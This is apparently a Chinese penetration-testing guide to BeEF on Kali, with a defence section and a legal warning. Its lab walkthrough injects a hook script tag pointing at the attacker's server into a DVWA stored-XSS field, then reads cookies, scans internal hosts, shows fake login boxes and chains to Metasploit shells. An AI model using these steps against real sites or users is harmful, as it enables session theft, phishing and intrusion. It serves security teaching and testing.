# BeEF（浏览器利用框架）

> **一句话**：往浏览器里塞一行 `<script>`，把受害者的浏览器变成你可控的「肉鸡浏览器」，然后从浏览器内部横向攻击。
> **分类**：漏洞利用 / 客户端攻击 ｜ **Kali 包**：`beef-xss`（命令 `beef-xss-start`、`beef-xss-stop`）｜ **官方文档**：<https://beefproject.com/> ｜ 项目 Wiki：<https://github.com/beefproject/beef/wiki>

---

## 1. 它解决什么问题

传统攻击目标是**服务器**，但很多场景里真正打开门户的是**客户端浏览器**：一个存储型 XSS、一个社工页面、一个被篡改的 JS 文件，就能让浏览器加载 BeEF 的 hook。

BeEF 的价值在于 **hook 之后的持续性**：只要标签页不关，你就拥有一个在受害者浏览器上下文中的「命令控制台」，可以：

- 枚举浏览器指纹、插件、内网 IP；
- 弹窗/伪造登录框（钓鱼）**注意：仅在授权测试中作为验证手段**；
- 读取 Cookie 发起会话劫持（若 Cookie 非 `HttpOnly`）；
- 作为**内网跳板**扫描浏览器能触达的内网主机（`Network` 模块，利用浏览器同源策略外的请求能力）；
- 与 Metasploit 联动拿 shell（`Metasploit` 模块）。

对比同类：

| 工具 | 定位 | 差异 |
|------|------|------|
| `beef-xss` | 浏览器后利用框架 | 有 UI、有模块生态、能持久控制 |
| `xsser` / XSStrike | XSS **漏洞扫描** | 找漏洞，不负责 hook 后的控制 |
| Metasploit `browser_autopwn` | 浏览器**漏洞利用** | 依赖具体漏洞；BeEF 依赖 JS 执行权（不依赖内存漏洞） |
| BEEF vs `weevely` | 一个控浏览器，一个控服务器 | 场景完全不同，见 [`../08-后渗透/weevely.md`](../08-后渗透/weevely.md) |

---

## 2. 工作原理

```
┌─────────────── Kali（攻击者） ───────────────┐
│  BeEF Server (Ruby)                         │
│   ├─ HTTP :3000  /hook.js   ← 被注入的脚本     │
│   ├─ HTTP :3000  /ui/panel  ← 管理面板         │
│   └─ WebSocket  /ws         ← 面板实时通信     │
└───────────────┬─────────────────────────────┘
                │ hook.js 每 N 秒轮询/长连接
┌───────────────▼─────────────────────────────┐
│  受害者浏览器（被 hook）                       │
│   hook.js → 注册为 zombie → 上报指纹/内网IP    │
│   执行模块指令（读 Cookie、起内网扫描、截图…）   │
└─────────────────────────────────────────────┘
```

关键概念：

- **hook**：页面里执行 `<script src="http://<攻击机>:3000/hook.js"></script>` 即被 hook。XSS 场景下就等价于把这一行注入到目标页面。
- **zombie（僵尸）**：被 hook 的浏览器会话，出现在面板 `Hooked Browsers` 里。绿色 = 在线，灰色 = 掉线。
- **模块（Modules）**：按分类组织——`Browser`（指纹/弹窗/Cookie）、`Network`（内网扫描/端口探测/ARP）、`Commands`（执行命令，需受控浏览器扩展配合）、`Exploit`（浏览器漏洞）、`Social Engineering`（钓鱼框）、`Metasploit`（联动 msf）、`Persistence`（持久化）。
- **能力边界**：BeEF 依赖浏览器**正常执行 JS**，不依赖内存破坏漏洞，所以现代浏览器的同源策略、`HttpOnly`、CSP 会显著限制效果。它是「把已有 XSS 的收益放大」的工具，不是万能兵工厂。

---

## 3. 安装与快速上手

```bash
sudo apt update
sudo apt install beef-xss
command -v beef-xss-start beef-xss-stop
```

启动（**首次会要求设置管理密码，不要用默认 `beef/beef`**）：

```bash
sudo beef-xss-start
```

```console
[*] Please wait for the BeEF service to start.
[*]  Web UI: http://127.0.0.1:3000/ui/panel
[*]    Hook: <script src="http://<IP>:3000/hook.js"></script>
[*] Example: <script src="http://127.0.0.1:3000/hook.js"></script>
```

停止：

```bash
sudo beef-xss-stop
```

> `beef-xss` 命令已被 Kali 标记为**废弃**，请使用 `beef-xss-start` / `beef-xss-stop`。

验证本机能否 hook（BeEF 自带演示页）：

```
浏览器打开：http://127.0.0.1:3000/demos/butcher/index.html
```

打开管理面板 `http://127.0.0.1:3000/ui/panel`，登录后应在 `Hooked Browsers` 里看到一台在线主机。

配置文件位置随版本不同，用下面命令定位再改：

```bash
ls -l /etc/beef-xss/config.yaml /usr/share/beef-xss/config.yaml 2>/dev/null
```

---

## 4. 核心参数详解

BeEF 主体是 Web UI，命令行参数很少；下表覆盖**启动参数 + 面板核心操作**：

| 参数/操作 | 作用 | 使用建议 |
|-----------|------|----------|
| `beef-xss-start` | 启动服务（systemd 封装） | 首次运行会提示设置密码 |
| `beef-xss-stop` | 停止服务 | 用完就停，减少暴露面 |
| `/ui/panel` | 管理面板 | 默认 `127.0.0.1:3000`，需要改 `http.host` 才能被外部访问 |
| `/hook.js` | 被注入的 hook 脚本 | 通过 XSS/社工让受害者加载它 |
| `/demos/butcher/index.html` | 内置演示靶页 | 自测 hook 是否通 |
| 配置文件 `http.host` / `http.port` | 监听地址与端口 | 靶场里改成攻击机实际 IP（如 `192.168.56.101`） |
| 配置文件 `credentials.user/passwd` | 面板账号 | **必须改掉默认值** |
| `Hooked Browsers` 面板 | zombie 列表 | 绿点=在线；点击进入单机控制 |
| `Commands` 标签页 | 模块搜索/运行 | 支持按模块名搜索，双击运行、看 `Module Results History` |
| `Run` 按钮 | 执行模块 | 可勾选 `Run in all browsers` 批量执行 |
| `Network` → `Ping Sweep` / `Port Scanner` | 从**被 hook 的浏览器**视角扫内网 | 可绕过部分边界防御，是 BeEF 的高价值能力 |
| `Browser` → `Get Cookie` / `Get Internal IP` | 取 Cookie / 内网地址 | 内网 IP 用于后续横向目标的线索 |
| `Social Engineering` → `Pretty Theft` / `Fake Notification` | 伪造登录框/通知（**演练检测能力用**） | 仅授权环境；这是攻击者最常用的钓鱼手法 |
| `Metasploit` 模块 | 与 msf 联动 | 需在配置里配好 msf RPC（`msf.enable`、`host`、`port`、`user`、`pass`） |
| `REST API` | 自动化控制 | `http://127.0.0.1:3000/api/...`，可脚本化 |
| 日志 | `/var/log/beef-xss/beef.log` | 排错第一步 |

---

## 5. 实战演练

> **环境声明**：以下全部在**自建靶场**进行，推荐 **DVWA**（本机 Docker 或虚拟机）作为存在 XSS 的靶站，Kali 作为攻击机，一台带浏览器的虚拟机（Windows/Linux 均可）作为「受害者」。示例网段 `192.168.56.0/24`（Kali `192.168.56.101`，受害者 `192.168.56.50`，靶站 `192.168.56.102`）。**禁止对未授权的站点或用户执行任何 hook/钓鱼操作。**

### 场景 1：验证 hook 链路（自测，先跑通再谈利用）

1. 改配置让 BeEF 监听在可达地址：

```bash
sudo grep -nE "^\s*(host|port):" /etc/beef-xss/config.yaml | head
# 期望看到 host 与 port，例如
#    host: "0.0.0.0"
#    port: "3000"
```

2. 启动并确认端口：

```bash
sudo beef-xss-start
ss -lntp | grep 3000
```

3. 受害者机浏览器打开演示页：

```
http://192.168.56.101:3000/demos/butcher/index.html
```

4. 攻击机面板：

```
http://127.0.0.1:3000/ui/panel
```

`Hooked Browsers` 里出现节点，图标为**绿色**即在线。

**解读**：演示页里已经内嵌了 `<script src="http://192.168.56.101:3000/hook.js"></script>`，等价于「攻击者已经拿到了一个能注入 JS 的位置」。

### 场景 2：把 XSS 变成 BeEF hook（DVWA 存储型 XSS）

DVWA 中把安全级别设为 `low`，在 XSS (Stored) 的留言框注入：

```html
<script src="http://192.168.56.101:3000/hook.js"></script>
```

受害者浏览器访问该留言页后，BeEF 面板出现**第二台** zombie。

随后在面板里按顺序验证（由浅入深）：

| 步骤 | 模块（Commands 里搜） | 输出解读 |
|------|----------------------|----------|
| 1 | `Browser` → `Get Internal IP` | 得到受害者内网地址，例如 `192.168.56.50` —— 后续横向目标线索 |
| 2 | `Browser` → `Get Cookie` | 若目标 Cookie 非 `HttpOnly`，可读出 `PHPSESSID` 之类，**会话劫持**的前置 |
| 3 | `Browser` → `Fingerprint` | 浏览器/插件/OS，判断是否有可利用的旧组件 |
| 4 | `Network` → `Ping Sweep`（填 `192.168.56.0/24`） | 从受害者浏览器视角扫内网，结果在 `Module Results` 中 |
| 5 | `Network` → `Port Scanner` | 对上一步发现的存活主机做端口探测 |
| 6 | `Social Engineering` → `Pretty Theft` | 弹出伪造登录框（**仅用于验证员工是否会被骗**） |

**解读**：第 4、5 步是 BeEF 的核心价值——**浏览器视角的内网侦察**，很多内网主机只信任内网来源，浏览器正好在内网里。

### 场景 3：与 Metasploit 联动（浏览器 → 系统 shell）

前提：BeEF 配置里启用 msf 联动，并让 msf 起 RPC。

```console
# 终端 A：起 msf 的 RPC
msf6 > load msgrpc Pass=yourStrongPass
[*] MSGRPC Service: 127.0.0.1:55552
```

```yaml
# /etc/beef-xss/config.yaml 中相关字段（示意）
beef:
  extension:
    metasploit:
      enable: true
      host: "127.0.0.1"
      port: 55552
      user: "msf"
      pass: "yourStrongPass"
```

重启 BeEF 后，在面板 `Commands` 里搜 `Metasploit`，选择对应模块（如针对旧浏览器的漏洞模块），填写 `SRVHOST`/`LHOST` 为攻击机 IP，运行。成功后 Metasploit 侧会出现 session：

```console
[*] Meterpreter session 1 opened (192.168.56.101:4444 -> 192.168.56.50:50123)
```

**解读**：这条链是「BeEF 负责**投递**（浏览器里跑 JS）→ Metasploit 负责**利用与收会话**」。拿到会话后进入后渗透流程，见 [`../08-后渗透/README.md`](../08-后渗透/README.md)。

---

## 6. 输出解读

| 现象 | 含义 | 下一步 |
|------|------|--------|
| `Hooked Browsers` 出现绿色节点 | hook 成功 | 双击进入单机控制页 |
| 节点变灰/消失 | 标签页关闭或网络断开 | hook 依赖页面存活；可配合 `Persistence` 模块（仅授权） |
| 模块显示 `Command submitted` | 指令已下发 | 到 `Module Results History` 看结果，非即时返回 |
| `Get Cookie` 返回空 | Cookie 有 `HttpOnly` 或跨域限制 | 换成 `Get Internal IP`/`Fingerprint` 这类不依赖凭据的模块 |
| `Ping Sweep` 结果为空 | 浏览器发不出请求（CSP/混合内容/网络隔离） | 检查目标页是否 HTTPS 混合内容被拦 |
| `Network` 模块超时 | 受害者浏览器所在网络禁止直连内网 | 换 `Commands`/`Browser` 类模块 |
| 面板无数据但服务在跑 | 面板没连上 WebSocket | 刷新页面；检查浏览器控制台报错 |
| Metasploit 模块报 RPC 失败 | msgrpc 未启动/密码不符/端口错 | 核对 `config.yaml` 与 `load msgrpc` 的参数 |

---

## 7. 与其他工具配合

```
XSS 漏洞（手工验证 / XSStrike 扫描）
        │
        └─► 注入 <script src="…/hook.js"> ──► BeEF hook
                                                 │
      ┌──────────────────────────────────────────┼───────────────────────────┐
      ▼                                          ▼                           ▼
 Browser 模块（Cookie/指纹/内网IP）        Network 模块（内网侦察）      Metasploit 联动
      │                                          │                           │
      └─► 会话劫持验证                      └─► 生成内网目标列表      └─► 系统 session
                                                                              │
                                                            msfvenom 生成 payload、impacket 横向
```

- 浏览器漏洞利用与 Payload 生成见 [`msfvenom.md`](msfvenom.md)、[`metasploit-framework.md`](metasploit-framework.md)。
- BeEF 侦察出的内网目标，用 [`../08-后渗透/chisel.md`](../08-后渗透/chisel.md) 或 [`../08-后渗透/ligolo-ng.md`](../08-后渗透/ligolo-ng.md) 打隧道。
- 社工演练另见 [`../11-社会工程与报告/set.md`](../11-社会工程与报告/set.md)（服务端侧钓鱼）。

---

## 8. 常见坑与排错

| 报错/现象 | 原因 | 解决 |
|-----------|------|------|
| `beef-xss` 提示 deprecated | Kali 改用新命令 | 用 `sudo beef-xss-start` |
| 启动报密码相关错误 | 仍在使用默认 `beef/beef` | 按提示设置新密码；或改 `config.yaml` 的 `credentials` |
| 受害者浏览器访问 `/hook.js` 404 | 受害者访问的是**靶站域名**而不是攻击机 IP | hook 的 URL 必须是攻击机可达 IP |
| 外部机器打不开 `/ui/panel` | 默认只监听 `127.0.0.1` | 改 `http.host: "0.0.0.0"`（**仅内网靶场**，勿暴露公网） |
| 面板能开但一直没有 zombie | 页面未真正执行 hook.js（可能被 CSP 拦） | 看浏览器 F12 → Console 的报错；换演示页先验证链路 |
| hook 的 IP 写成 `127.0.0.1` | 从本机测试复制粘贴 | 必须写成受害者能路由到的攻击机 IP |
| 依赖/启停异常 | systemd 单元或 Ruby 依赖问题 | `sudo beef-xss-stop` 后 `journalctl -u beef-xss -n 50` 看日志 |
| `Network` 模块全部失败 | 目标页 HTTPS 而 hook 是 HTTP（混合内容被拦） | 用 HTTPS 承载 BeEF（自签证书）或改测试环境为 HTTP |
| msf 联动无反应 | 未 `load msgrpc` / 密码不一致 | 两侧参数逐项核对，重启 BeEF |
| 被杀软/浏览器拦截 | 现代浏览器对可疑脚本有防护 | 属正常现象；这正说明防御生效 |

---

## 9. 防御视角（蓝队）

| 攻击面 | 检测信号 | 缓解 |
|--------|----------|------|
| XSS 注入点 | 请求/响应中出现 `<script src="http://…/hook.js">`、异常外域脚本 | 输出编码、CSP（`script-src 'self'`）、WAF |
| 外域脚本加载 | 页面加载**非白名单域名**的 JS，尤其是内网 IP | CSP、SRI（子资源完整性）、代理出站白名单 |
| Cookie 被读取 | 大量异常 `document.cookie` 访问无从日志体现，但**会话重用**会出现异地/异 IP 登录 | Cookie 加 `HttpOnly` + `Secure` + `SameSite=Lax/Strict` |
| 浏览器发起内网扫描 | 单客户端短时间内向多个内网 IP/端口发起请求 | 内网东西向访问控制、浏览器侧 EDR/网络行为检测 |
| 伪装登录框（社工） | 用户上报异常弹窗；页面 DOM 被注入 iframe/form | 安全培训、密码管理器（能识别伪造域）、MFA |
| BeEF 特征 | 默认 `/hook.js`、`/ui/panel` 路径、默认 User-Agent 与心跳周期 | 威胁情报/IOC 阻断、IDS 特征、出站限制 |
| 面板暴露 | 3000 端口对外开放 | 只监听内网、防火墙限制、强口令 |

**核心防御结论**：BeEF 的收益完全建立在「已经有一个能注入 JS 的点」之上。**修好 XSS、上 CSP、Cookie 加 `HttpOnly`**，BeEF 就基本失去价值。

---

## 10. 参考

- BeEF 官网：<https://beefproject.com/>
- BeEF Wiki（模块列表与配置）：<https://github.com/beefproject/beef/wiki>
- Kali 工具页：<https://www.kali.org/tools/beef-xss/>
- 内置演示靶页：`http://127.0.0.1:3000/demos/butcher/index.html`
- `sudo beef-xss-start -h`、`man beef-xss`（如有）

## ⚠️ 法律与伦理

未经授权对他人站点注入 hook、读取他人浏览器数据、投放伪造登录框（钓鱼）均属违法行为，可能触犯《刑法》第 285/286 条，并涉及《个人信息保护法》《网络安全法》。BeEF 的社工与 Cookie 窃取类模块**仅可在取得书面授权、明确告知参与者的测试与演练中使用**，禁止对真实用户、生产站点或公网目标操作。测试产生的日志与会话数据应加密保存、测试结束即销毁。
